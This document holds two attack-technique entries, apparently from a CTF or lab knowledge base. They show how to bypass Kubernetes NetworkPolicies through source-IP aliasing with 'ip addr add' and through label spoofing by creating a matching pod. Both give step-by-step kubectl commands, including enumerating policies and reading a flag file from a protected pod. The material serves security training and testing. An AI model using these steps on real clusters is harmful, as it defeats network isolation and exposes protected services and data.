title: K8s CNI IP Spoofing — NetworkPolicy ipBlock Bypass via Source IP Spoofing (K8S-30)
description: Kubernetes NetworkPolicies can restrict traffic by destination CIDR using ipBlock rules. However, these rules check the source IP of each packet, and within a pod's network namespace an attacker can add arbitrary IP aliases to bypass IP-based access controls. Attack: (1) Verify the NetworkPolicy blocks traffic: kubectl exec attacker-pod -- wget -qO- --timeout=3 http://FLAG_SERVICE_IP:8080 (should fail). (2) Discover the allowed CIDR: kubectl get networkpolicy -n trust-zone ip-allowlist -o yaml — note the ipBlock cidr value (e.g., 10.244.1.0/24). (3) Find an allowed pod's IP within the CIDR: TRUSTED_IP=$(kubectl get pod trusted-pod -n trust-zone -o jsonpath='{.status.podIP}'). (4) Add the trusted IP as a secondary address on the attacker pod's interface: kubectl exec attacker-pod -- ip addr add $TRUSTED_IP/32 dev eth0. (5) Access the flag service — the NetworkPolicy now sees the source IP as matching the allowed CIDR: kubectl exec attacker-pod -- wget -qO- http://FLAG_SERVICE_IP:8080 (should succeed). Key insights: (a) CNI-assigned pod IPs are simple Linux network interfaces — ip addr add can create IP aliases within the pod's netns. (b) This bypasses ipBlock-based NetworkPolicies but not podSelector-based ones. (c) The spoofed IP must be unused or belong to a pod that doesn't need the traffic — IP conflicts may disrupt communication. (d) cleanup: ip addr del $TRUSTED_IP/32 dev eth0.
techniques: kubectl get networkpolicy -n NAMESPACE NAME -o yaml
kubectl get pod trusted-pod -n trust-zone -o jsonpath='{.status.podIP}'
kubectl exec attacker-pod -- ip addr add SPOOFED_IP/32 dev eth0
kubectl exec attacker-pod -- ip addr del SPOOFED_IP/32 dev eth0
kubectl exec attacker-pod -- ip addr show eth0
indicators: NetworkPolicy with ipBlock ingress rule (specific CIDR allowlist)
Known allowed pod IP within the CIDR range
Attacker pod can run ip commands (ip addr add)
Flag service accessible only from allowed CIDR
prerequisites: kubectl exec access to attacker pod
Attacker pod has iproute2 tools (ip command)
NetworkPolicy uses ipBlock (not podSelector) for ingress control
Known allowed pod IP or CIDR enumeration

title: K8s NetworkPolicy Label Spoofing — podSelector Bypass via Pod Label Manipulation (K8S-27)
description: Kubernetes NetworkPolicies using podSelector match pods by their labels. If an attacker can create pods with arbitrary labels, they can bypass network isolation by creating a pod with the required labels in the target namespace — even if their existing pods are blocked by a restrictive NetworkPolicy. Attack: (1) Verify the NetworkPolicy blocks traffic from current pod: kubectl exec attacker-pod -n attacker-ns -- wget -qO- --timeout=3 http://flag-service.isolated-ns.svc.cluster.local:8080/flag (should fail). (2) Discover the NetworkPolicy rules: kubectl get networkpolicy -n isolated-ns protect-flag -o yaml — look for the podSelector matchLabels (e.g., tier: frontend). (3) Create a new pod with the required label in the target namespace: kubectl run bypass-pod --image=alpine:latest -n isolated-ns --labels='tier=frontend' -- sleep 3600. (4) Wait for pod readiness: kubectl wait --for=condition=Ready pod/bypass-pod -n isolated-ns --timeout=30s. (5) Access the flag service from the bypass pod: kubectl exec -n isolated-ns bypass-pod -- wget -qO- http://flag-service:8080/flag. (6) Alternative: directly read from the flag pod: FLAG_POD=$(kubectl get pods -n isolated-ns -l app=flag-service -o jsonpath='{.items[0].metadata.name}'); kubectl exec -n isolated-ns $FLAG_POD -- cat /tmp/flag.txt. Key insights: (a) NetworkPolicy podSelector filtering is based on the pod's labels at creation time — any pod with matching labels is allowed. (b) The attacker does not need to modify existing pods; creating a new pod with the right labels suffices. (c) This works even when the attacker's original pod is in a different namespace — as long as the NetworkPolicy allows pods from any namespace with matching labels.
techniques: kubectl get networkpolicy -n isolated-ns protect-flag -o yaml
kubectl exec -n isolated-ns bypass-pod -- wget -qO- http://flag-service:8080/flag
kubectl get pods -n isolated-ns -l app=flag-service -o jsonpath='{.items[0].metadata.name}'
indicators: NetworkPolicy with podSelector ingress rule requiring specific labels
Flag service in isolated namespace accessible via label matching
User has pod creation permissions in target namespace
Existing pod blocked by NetworkPolicy but label requirement discoverable
prerequisites: kubectl access with get networkpolicy and create pod permissions
NetworkPolicy uses podSelector labels (not just namespaceSelector or ipBlock)
Pod creation permission in the isolated/target namespace
Knowledge of the label key-value required by the NetworkPolicy
